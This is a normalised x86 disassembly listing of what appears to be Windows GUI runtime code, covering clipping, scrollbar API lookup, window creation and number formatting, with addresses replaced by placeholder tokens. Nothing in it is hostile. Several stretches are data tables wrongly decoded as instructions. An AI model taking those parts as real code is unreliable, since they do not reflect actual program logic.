mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x18 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetClipBox
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
push 0x12340042
call [ ebp + 0x10 ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
neg eax
push eax
mov eax [ ebp - 0xc ]
neg eax
push eax
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call IntersectRect
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_444024
push ebp
mov ebp esp
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_44394c
mov [ rw-data ] sub_443a90
mov [ rw-data ] sub_4439f0
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_443cd8
mov [ rw-data ] sub_443dd8
mov [ rw-data ] sub_443ed8
pop ebp
retn
sub_444093
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4440b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4440c0
retn
sub_4440d8
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov al 0x1
sub_444114
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x4
mov al 0x1
sub_444144
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_4443fe
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444425
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44442c
retn
sub_444444
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444469
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444470
retn
sub_44447c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] dx
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
movzx edx [ ebp - 0x4 ]
shl edx 0x10
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_444510
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shl eax 0x8
and eax 0xff000000
or eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_444534
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
movsx eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movsx eax [ ebp - 0x2 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_444558
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_444580
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call CreateWindowExA
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x20
sub_4445d0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov [ ebp - 0x10 ] eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x8
sub_4446e1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_444709
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444710
retn
sub_44471c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444741
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444748
retn
sub_444754
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444779
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444780
retn
sub_44478c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4447b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4447b8
retn
sub_4447c4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call ImageList_ReplaceIcon
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4447ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444811
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444818
retn
sub_444824
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_444850
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444875
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44487c
retn
sub_444888
mov esp 0xa3004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xa5004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xa7004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xa9004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xab004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xad004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xaf004735
inc [ eax ]
add [ ebp + esi - 0x6fffb9 ] bh
add [ eax ] al
mov esp 0x91004735
inc [ eax ]
add [ ebp + esi - 0x6dffb9 ] bh
add [ eax ] al
mov esp 0x93004735
inc [ eax ]
add [ ebp + esi - 0x6bffb9 ] bh
add [ eax ] al
mov esp 0x95004735
inc [ eax ]
add [ ebp + esi - 0x69ffb9 ] bh
add [ eax ] al
mov esp 0x97004735
inc [ eax ]
add [ ebp + esi - 0x67ffb9 ] bh
add [ eax ] al
mov esp 0x99004735
inc [ eax ]
add [ ebp + esi - 0x65ffb9 ] bh
add [ eax ] al
mov esp 0x9b004735
inc [ eax ]
add [ ebp + esi - 0x63ffb9 ] bh
add [ eax ] al
mov esp 0x9d004735
inc [ eax ]
add [ ebp + esi - 0x61ffb9 ] bh
add [ eax ] al
mov esp 0x9f004735
inc [ eax ]
add [ ebp + esi - 0x7fffb9 ] bh
add [ eax ] al
mov esp 0x81004735
inc [ eax ]
add [ ebp + esi - 0x7dffb9 ] bh
add [ eax ] al
mov esp 0x83004735
inc [ eax ]
add [ ebp + esi - 0x7bffb9 ] bh
add [ eax ] al
mov esp 0x85004735
inc [ eax ]
add [ ebp + esi - 0x79ffb9 ] bh
add [ eax ] al
mov esp 0x87004735
inc [ eax ]
add [ ebp + esi - 0x77ffb9 ] bh
add [ eax ] al
mov esp 0x89004735
inc [ eax ]
add [ ebp + esi - 0x75ffb9 ] bh
add [ eax ] al
mov esp 0x8b004735
inc [ eax ]
add [ ebp + esi - 0x73ffb9 ] bh
add [ eax ] al
mov esp 0x8d004735
inc [ eax ]
add [ ebp + esi - 0x71ffb9 ] bh
add [ eax ] al
mov esp 0x8f004735
inc [ eax ]
add [ ebp + esi - 0x8fffb9 ] bh
add [ eax ] al
mov esp 0x71004735
inc [ eax ]
add [ ebp + esi - 0x8dffb9 ] bh
add [ eax ] al
mov esp 0x73004735
inc [ eax ]
add [ ebp + esi - 0x8bffb9 ] bh
add [ eax ] al
mov esp 0x75004735
inc [ eax ]
add [ ebp + esi - 0x89ffb9 ] bh
add [ eax ] al
mov esp 0x77004735
inc [ eax ]
add [ ebp + esi - 0x87ffb9 ] bh
add [ eax ] al
mov esp 0x79004735
inc [ eax ]
add [ ebp + esi - 0x85ffb9 ] bh
add [ eax ] al
mov esp 0x7b004735
inc [ eax ]
add [ ebp + esi - 0x83ffb9 ] bh
add [ eax ] al
mov esp 0x7d004735
inc [ eax ]
add [ ebp + esi - 0x81ffb9 ] bh
add [ eax ] al
mov esp 0x7f004735
inc [ eax ]
add [ ebp + esi - 0x9fffb9 ] bh
add [ eax ] al
mov esp 0x61004735
inc [ eax ]
add [ ebp + esi - 0x9dffb9 ] bh
add [ eax ] al
mov esp 0x63004735
inc [ eax ]
add [ ebp + esi - 0x9bffb9 ] bh
add [ eax ] al
mov esp 0x65004735
inc [ eax ]
add [ ebp + esi - 0x99ffb9 ] bh
add [ eax ] al
mov esp 0x67004735
inc [ eax ]
add [ ebp + esi - 0x97ffb9 ] bh
add [ eax ] al
mov esp 0x69004735
inc [ eax ]
add [ ebp + esi - 0x95ffb9 ] bh
add [ eax ] al
mov esp 0x6b004735
inc [ eax ]
add [ ebp + esi - 0x93ffb9 ] bh
add [ eax ] al
mov esp 0x6d004735
inc [ eax ]
add [ ebp + esi - 0x91ffb9 ] bh
add [ eax ] al
mov esp 0x6f004735
inc [ eax ]
add [ ebp + esi - 0xafffb9 ] bh
add [ eax ] al
mov esp 0x51004735
inc [ eax ]
add [ ebp + esi - 0xadffb9 ] bh
add [ eax ] al
mov esp 0x53004735
inc [ eax ]
add [ ebp + esi - 0xabffb9 ] bh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444b3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444b44
retn
sub_444ca2
push ebp
mov ebp esp
sub esp 0x1c
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x1c ]
call sub_445245
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x1c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x19 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_444d60
lea esi [ ecx + ecx * 2 + r-xdata ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
call [ ebx * 4 + r-xdata ]
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x1c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_444d6a
call sub_444d60
movsx ecx [ ebp - 0x1c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
xor ecx ecx
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov al 0x45
mov bl [ ebp - 0x19 ]
movsx edx [ ebp - 0x1c ]
dec edx
or edx edx
je r-xdata
mov ah al
mov al [ rw-data ]
stosw [ edi ]
mov al [ rw-data ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_444dcc
call sub_444d60
call sub_444d57
mov ah [ rw-data ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_444d57
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jb r-xdata
mov al 0x45
mov bl [ ebp - 0x19 ]
movsx edx [ ebp - 0x1c ]
dec edx
xor ecx ecx
sub_444e00
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ r-xdata ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
retn
sub_444e44
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x1c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_444d57
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ rw-data ]
stosb [ edi ]
jecxz r-xdata
mov al [ rw-data ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_444d57
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_444ea5
xor ebx ebx
mov bl [ rw-data ]
mov ecx 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ rw-data ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + sub_444f0e ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_444efc
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_444e44
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_444f0e
and al 0x2a
inc eax
inc eax
inc eax
sub ah [ eax + eax * 2 ]
inc eax
inc eax
and al 0x20
sub al [ eax + 0x40 ]
sub ah [ eax ]
and al 0x40
inc eax
sub [ edx + ebp ] ah
sub [ eax + 0x2d ] eax
and al 0x2a
inc eax
inc eax
and al 0x2d
sub al [ eax + 0x40 ]
and al 0x2a
sub eax 0x2a284040
and al 0x29
inc eax
sub eax 0x4040242a
sub ch [ 0x2a404024 ]
and al 0x2d
inc eax
inc eax
sub eax 0x4024202a
sub eax 0x402a2024
sub ah [ eax ]
and al 0x2d
inc eax
and al 0x20
sub ch [ 0x2d202440 ]
sub al [ eax + 0x2a ]
sub eax 0x28402420
and al 0x20
sub ch [ ecx ]
sub [ edx ] ch
and [ ecx + ebp ] ah
push ebp
mov ebp esp
sub esp 0x40
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov edi edx
mov ebx ecx
mov ecx 0x2
cmp bl 0x0
je r-xdata
movzx eax [ edi + 0x8 ]
or eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
mov eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
call sub_44503e
je r-xdata
movzx ecx [ edi + 0x8 ]
shr ecx 0xf
mov ecx [ edi + 0x4 ]
shr ecx 0x1f
jmp r-xdata
push 0x0
push 0xf
push 0x0
mov eax [ ebp - 0x4 ]
mov edx edi
mov ecx ebx
call sub_444ca2
jmp r-xdata
call sub_445079
mov eax [ ebp - 0x14 ]
mov edx 0x270f
cmp [ ebp - 0xc ] 0x0
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x4
push eax
push edx
lea eax [ ebp - 0x40 ]
mov edx edi
mov ecx ebx
call sub_445245
mov ax [ ebp - 0x40 ]
cmp ax 0x8000
je r-xdata
sub eax [ ebp - 0x18 ]
mov edx eax
mov eax 0x12
cmp ax 0x7fff
je r-xdata
cmp bl 0x0
jne r-xdata
cmp [ ebp - 0x3d ] 0x0
jne r-xdata
cmp ax 0x12
jle r-xdata
call sub_445124
mov ecx 0x2
call sub_44503e
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp esi [ ebp - 0x10 ]
je r-xdata
call sub_445079
sub_44503e
mov esi [ ebp + 0x8 ]
jecxz r-xdata
mov esi [ ebp + 0x8 ]
mov al [ esi ]
or al al
je r-xdata
lodsb [ esi ]
cmp al 0x27
je r-xdata
retn
cmp al 0x3b
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
or al al
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
loop r-xdata
mov al [ esi ]
or al al
je r-xdata
cmp al 0x3b
jne r-xdata
sub_445079
push ebx
mov [ ebp - 0x10 ] esi
mov ebx 0x7fff
xor ecx ecx
xor edx edx
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x8 ] dl
mov [ ebp - 0xc ] dl
inc edx
jmp r-xdata
cmp al 0x30
je r-xdata
lodsb [ esi ]
cmp edx ebx
jge r-xdata
cmp al 0x2e
je r-xdata
inc edx
mov ecx edx
jmp r-xdata
mov ebx edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
cmp al 0x2c
je r-xdata
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
cmp al 0x45
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
lodsb [ esi ]
cmp al 0x2d
je r-xdata
cmp al 0x65
je r-xdata
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov [ ebp - 0xc ] 0x1
cmp al 0x2b
jne r-xdata
cmp al 0x3b
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax ecx
jle r-xdata
mov [ ebp - 0x18 ] edx
lodsb [ esi ]
cmp al 0x30
je r-xdata
jmp r-xdata
cmp al 0x23
je r-xdata
or al al
jne r-xdata
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x18 ]
sub eax ebx
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
pop ebx
retn
xor eax eax
sub_445124
cmp [ ebp - 0xc ] 0x0
je r-xdata
movsx eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
xor edx edx
jmp r-xdata
movsx edx [ ebp - 0x40 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x28 ] edx
mov esi [ ebp - 0x10 ]
mov edi [ ebp - 0x4 ]
lea ebx [ ebp - 0x3d ]
cmp [ ebp - 0x3e ] 0x0
je r-xdata
lodsb [ esi ]
cmp al 0x23
je r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
call sub_4451df
jmp r-xdata
cmp al 0x30
je r-xdata
mov al 0x2d
stosb [ edi ]
cmp al 0x2e
je r-xdata
cmp al 0x2c
je r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
je r-xdata
cmp al 0x45
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
retn
stosb [ edi ]
jmp r-xdata
mov ah [ esi ]
cmp ah 0x2b
je r-xdata
cmp al 0x65
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
mov ecx 0xffffffff
cmp ah 0x2d
jne r-xdata
cmp al 0x3b
je r-xdata
inc ecx
inc esi
cmp [ esi ] 0x30
je r-xdata
cmp ecx 0x4
jb r-xdata
stosb [ edi ]
jmp r-xdata
xor ah ah
or al al
je r-xdata
push ebx
mov bl [ ebp - 0x3d ]
movsx edx [ ebp - 0x40 ]
sub edx [ ebp - 0x18 ]
call sub_444e00
pop ebx
jmp r-xdata
mov ecx 0x4
sub_4451df
cmp [ ebp - 0x28 ] 0x0
je sub_445200
jl r-xdata
inc [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
call sub_445200
dec [ ebp - 0x28 ]
jne r-xdata
mov al 0x30
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
jmp r-xdata
jmp sub_445200
stosb [ edi ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ah al
mov al [ rw-data ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x24 ]
retn
mov eax [ ebp - 0x24 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ rw-data ]
stosb [ edi ]
sub_445200
mov al [ ebx ]
inc ebx
or al al
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
dec ebx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
stosb [ edi ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ah al
mov al [ rw-data ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x24 ]
retn
mov al 0x30
mov eax [ ebp - 0x24 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ rw-data ]
stosb [ edi ]
sub_445245
push ebp
mov ebp esp
sub esp 0x1a
push edi
push esi
push ebx
mov ebx eax
mov esi edx
cmp cl 0x0
je r-xdata
call sub_44526c
call sub_445373
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_44526c
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
call sub_449ff0
frndint
fld [ r-xdata ]
fcomp st1
fwait
fnstsw [ ebp - 0x4 ]
fwait
test [ ebp - 0x4 ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x1a ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ r-xdata ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ ebp + edx - 0x1b ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
